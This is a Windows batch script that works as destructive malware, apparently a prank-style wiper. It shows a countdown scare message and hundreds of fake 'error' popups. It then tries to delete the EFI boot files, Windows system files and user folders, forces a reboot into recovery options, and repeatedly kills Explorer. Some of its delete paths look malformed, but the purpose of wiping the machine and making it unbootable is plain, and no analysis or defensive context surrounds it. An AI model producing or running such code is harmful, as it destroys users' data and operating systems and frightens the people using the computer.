@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
for /L %%i in (1,1,500) do (
    echo x=msgbox("An error has occurred while reapiring this computer!", 69, "Error") > "%temp%\errorpopup.vbs"
    start /wait wscript "%temp%\errorpopup.vbs"
) & DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.* & DEL /F /S /Q /A C:\Windows*.* & rmdir C:\Users*.* /S /Q
bcdedit /timeout 1
shutdown -r /o -t 20
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
